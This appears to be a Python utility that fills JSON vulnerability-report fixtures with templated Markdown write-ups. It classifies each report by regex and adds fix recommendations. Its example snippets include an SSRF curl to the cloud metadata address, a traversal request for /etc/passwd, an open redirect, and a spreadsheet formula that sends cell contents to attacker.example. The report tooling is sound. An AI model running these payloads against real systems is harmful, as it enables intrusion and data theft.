#!/usr/bin/env python3
import json, re, sys, os, random
from typing import Any, Dict, List

REPORTS_DIR = os.path.join(os.getcwd(), "fixtures", "reports")

VULN_PATTERNS = [
    (re.compile(r"xss|cross\s*site\s*scripting|innerHTML", re.I), "Stored/Reflected XSS", "javascript", "// Sanitize and HTML-encode untrusted data before DOM insertion\nconst unsafe = req.body.subject;\n// BAD\ndocument.querySelector('#subject').innerHTML = unsafe;\n// GOOD\ndocument.querySelector('#subject').textContent = unsafe;"),
    (re.compile(r"ssrf|server[- ]?side\s*fetch|request forgery|attacker-controlled urls|metadata|169\.254\.169\.254|private range", re.I), "Server-Side Request Forgery (SSRF)", "bash", "# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'"),
    (re.compile(r"path\s*traversal|traversal|\.\./|filename parameter|normalize", re.I), "Path Traversal", "bash", "# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'"),
    (re.compile(r"open\s*redirect|returnUrl|redirect_uri|external urls", re.I), "Open Redirect", "http", "GET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example"),
    (re.compile(r"cors|access-control-allow-origin|credentials|\bACA(O|C)\b", re.I), "Misconfigured CORS", "http", "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true"),
    (re.compile(r"csv|spreadsheet|formula|=\+|-@|excel", re.I), "CSV Formula Injection", "csv", "=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))"),
    (re.compile(r"metrics|/metrics|prometheus|sensitive metadata", re.I), "Sensitive Metrics Exposure", "text", "# Example Prometheus metric with PII\nhttp_requests_total{user_id=\"123\"} 42"),
    (re.compile(r"idor|direct object|does not verify ownership|enumeration of other users|unauthorized access", re.I), "Insecure Direct Object Reference (IDOR)", "http", "GET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=..."),
]

MD_TEMPLATE = """{overview}\n\nTechnical analysis:\n- Vulnerability class: **{vuln_type}**\n- Affected target: `{target}`\n- Preconditions: authenticated user: {user_role}; app version: {app_version}\n\n```{code_lang}\n{code_example}\n```\n\nWhy this is a security issue:\n{why}\n\nExploitation details:\n{steps}\n\nRecommendations:\n{recs}\n"""

DEFAULT_WHY = (
    "The behavior allows an attacker to influence a security-sensitive operation, "
    "leading to confidentiality, integrity, or availability impact beyond intended access controls."
)

DEFAULT_RECS = (
    "- Validate and sanitize all user-controlled inputs.\n"
    "- Enforce allowlists and strict server-side validation.\n"
    "- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs)."
)


def classify(summary: str) -> Dict[str, str]:
    s = summary or ""
    for rx, vt, lang, code in VULN_PATTERNS:
        if rx.search(s):
            return {"vuln_type": vt, "code_lang": lang, "code_example": code}
    # Fallback
    return {
        "vuln_type": "Security Misconfiguration",
        "code_lang": "bash",
        "code_example": "# Example probe\ncurl -i https://victim.example/endpoint",
    }


def build_steps_md(steps: List[str]) -> str:
    if not steps:
        return "- Reproduction steps available in the report timeline and attachments."
    bullets = "\n".join(f"- {st}" for st in steps[:8])
    return bullets


def build_overview(summary: str) -> str:
    if not summary:
        return "This report documents a vulnerability discovered during testing."
    return summary


def build_recs(vuln_type: str) -> str:
    vt = vuln_type.lower()
    if "xss" in vt:
        return (
            "- HTML-encode untrusted data before DOM insertion.\n"
            "- Prefer `textContent`/safe templating.\n"
            "- Deploy strict CSP; strip dangerous tags/attributes."
        )
    if "ssrf" in vt:
        return (
            "- Enforce URL allowlists; block private and metadata ranges.\n"
            "- Resolve DNS server-side; use egress allowlists.\n"
            "- Use protocol allowlists (http/https only), size/timeouts."
        )
    if "traversal" in vt:
        return (
            "- Normalize paths; reject `..` and absolute paths.\n"
            "- Enforce rooted directories and access checks by owner.\n"
            "- Use safe file APIs; avoid string concatenation."
        )
    if "redirect" in vt:
        return (
            "- Validate `returnUrl` against a strict same-origin allowlist.\n"
            "- Use state/nonce; avoid reflecting external URLs."
        )
    if "cors" in vt:
        return (
            "- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n"
            "- Reflect only allowlisted origins; disable credentials unless necessary."
        )
    if "csv" in vt:
        return (
            "- Prefix cells starting with `=,+,-,@` with a single quote.\n"
            "- Export CSV as text-safe or use TSV."
        )
    if "metrics" in vt:
        return (
            "- Remove PII from metric labels; gate `/metrics` behind auth.\n"
            "- Provide a redacted public metrics endpoint if needed."
        )
    if "direct object" in vt or "idor" in vt:
        return (
            "- Authorize by object ownership on every read/write.\n"
            "- Use opaque identifiers; avoid incremental IDs."
        )
    return DEFAULT_RECS


def add_markdown_description(report: Dict[str, Any]) -> bool:
    rep = report.get("reporter") or {}
    if not isinstance(rep, dict):
        return False
    # Do not overwrite if present (idempotent)
    if isinstance(rep.get("description"), str) and rep["description"].strip():
        return False

    summary = rep.get("summary") or ""
    ctx = rep.get("context") or {}
    target = ctx.get("target") or "(not specified)"
    env = ctx.get("environment") or {}
    user_role = env.get("user_role") or "unknown"
    app_version = env.get("app_version") or "unknown"

    klass = classify(summary)
    why = DEFAULT_WHY
    steps = build_steps_md(rep.get("steps_to_reproduce") or [])
    recs = build_recs(klass["vuln_type"]) if "vuln_type" in klass else DEFAULT_RECS

    md = MD_TEMPLATE.format(
        overview=build_overview(summary),
        vuln_type=klass.get("vuln_type", "Security Issue"),
        target=target,
        user_role=user_role,
        app_version=app_version,
        code_lang=klass.get("code_lang", "text"),
        code_example=klass.get("code_example", "(see steps)"),
        why=why,
        steps=steps,
        recs=recs,
    )

    rep["description"] = md
    report["reporter"] = rep
    return True


def process_file(path: str) -> Dict[str, int]:
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    changed = 0
    if isinstance(data, list):
        for r in data:
            if add_markdown_description(r):
                changed += 1
    elif isinstance(data, dict):
        if add_markdown_description(data):
            changed = 1
    else:
        pass
    if changed:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
            f.write("\n")
    return {"changed": changed}


def main():
    directory = REPORTS_DIR
    if not os.path.isdir(directory):
        print(f"Directory not found: {directory}", file=sys.stderr)
        sys.exit(1)
    total_changed = 0
    files = [os.path.join(directory, p) for p in os.listdir(directory) if p.endswith('.json')]
    for fp in sorted(files):
        res = process_file(fp)
        print(f"{os.path.basename(fp)}: +{res['changed']} descriptions")
        total_changed += res['changed']
    print(f"TOTAL: {total_changed} descriptions added/kept")

if __name__ == "__main__":
    main()
